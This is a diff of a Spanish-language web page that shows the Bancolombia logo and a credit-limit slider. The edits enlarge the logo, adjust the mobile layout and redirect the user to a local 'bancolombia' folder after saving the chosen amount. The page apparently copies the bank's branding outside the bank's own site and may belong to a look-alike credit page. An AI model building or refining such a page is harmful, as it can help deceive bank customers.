@@ -28,16 +28,17 @@
             background: #FFFFFF;
         }
 
-        /* Header con logo */
+        /* Header con logo - 3 VECES MÁS GRANDE */
         .header {
             text-align: center;
-            margin-bottom: 32px;
-            padding-top: 16px;
+            margin-bottom: 24px;
+            padding-top: 8px;
         }
 
         .header img {
-            width: 160px;
+            width: 480px;
             height: auto;
+            max-width: 100%;
         }
 
         /* Título principal */
@@ -288,7 +289,8 @@
             }
 
             .header img {
-                width: 140px;
+                width: 100%;
+                max-width: 400px;
             }
 
             .main-title h1 {
@@ -313,6 +315,12 @@
             }
         }
 
+        @media (max-width: 380px) {
+            .header img {
+                max-width: 320px;
+            }
+        }
+
         /* Mejoras de accesibilidad */
         @media (prefers-reduced-motion: reduce) {
             * {
@@ -324,7 +332,7 @@
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
+        <!-- Header con logo 3 VECES MÁS GRANDE -->
         <div class="header">
             <img src="img/logo-removebg-preview.png" alt="Bancolombia">
         </div>
@@ -368,17 +376,12 @@
             // ============================================
             // REDIRECCIÓN INTERNA
             // ============================================
-            // Desde: /bancolombia/product/credito.html (o donde esté)
-            // Hacia: ../index.html (sube un nivel)
             const LINK_REDIRECCION = "../bancolombia/index.html";
             // ============================================
 
             document.getElementById("btnSolicitar").addEventListener("click", function () {
-                // Guardar el cupo seleccionado en localStorage
                 const cupo = document.getElementById('cupoSlider').value;
                 localStorage.setItem('cupo_seleccionado', cupo);
-                
-                // Redirigir
                 window.location.href = LINK_REDIRECCION;
             });
         </script>
